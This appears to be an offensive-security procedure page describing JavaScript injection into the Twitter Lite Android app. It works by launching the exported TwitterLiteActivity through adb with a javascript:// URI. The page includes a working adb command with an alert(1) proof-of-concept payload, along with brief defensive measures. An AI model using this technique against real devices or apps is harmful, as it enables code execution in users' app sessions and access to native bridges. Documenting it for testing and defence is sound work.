---
tags:
  - android
  - javascript-injection
type: procedure
tools:
  - '[[tools/ADB-Android-Debug-Bridge]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/adb-start-twitterlite-with-javascript-alert]]'
verified: false
platforms:
  - Android
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:24:34.652Z'
sub_techniques: []
id: 49655e14-05f2-4678-a840-fae07f979dfe
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject JavaScript via javascript:// URI in TwitterLiteActivity

## Summary

This procedure injects and executes arbitrary JavaScript code in the Twitter Lite app's WebView by launching the exported TwitterLiteActivity with a javascript:// URI, exploiting the absence of URI scheme sanitization to run payloads that interact with the DOM or app interfaces.

## Description

Due to the exported nature of TwitterLiteActivity and lack of validation on the data URI in the intent, an attacker can encode JavaScript payloads in a javascript:// scheme. The WebView interprets and executes the JS directly upon loading, allowing code injection to manipulate the page, access JavaScript bridges to native code, or perform other malicious actions. This is a precursor to more advanced exploits like interface enumeration.

## Requirements

1. Android device with Twitter Lite installed and ADB access
2. Basic knowledge of JavaScript for payload crafting
3. URL encoding for newlines and special characters in payloads

## Defense

Defensive measures and detection strategies:

- Implement URI scheme whitelisting in the activity (e.g., only allow http/https)
- Disable JavaScript or use shouldOverrideUrlLoading to intercept and block javascript://
- Log and monitor WebView loads for suspicious schemes

## Objectives

1. Execute custom JS in the app's WebView context
2. Bypass intent data validation for code injection
3. Set up access to internal app objects

## Instructions

### Step 1: Craft JS Payload

**Context**: Prepare a simple test payload like alert(1) to verify execution.

Encode the payload: javascript://example.com%0A alert(1); ( %0A for newline).

### Step 2: Inject via ADB Intent

**Context**: Start the activity with the javascript:// URI to trigger execution.

**Command** ([[commands/adb-start-twitterlite-with-javascript-alert]]):
```bash
adb shell am start -n com.twitter.android.lite/com.twitter.android.lite.TwitterLiteActivity -d "javascript://example.com%0A alert(1);"
```

> The intent launches the activity, and the WebView executes the JS payload, showing an alert.

**Expected Output**: Alert dialog with '1' in the app.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used

- [[commands/adb-start-twitterlite-with-javascript-alert]]

## Tools Used

- [[tools/ADB-Android-Debug-Bridge]]

## Tags

- android
- javascript-injection
- webview
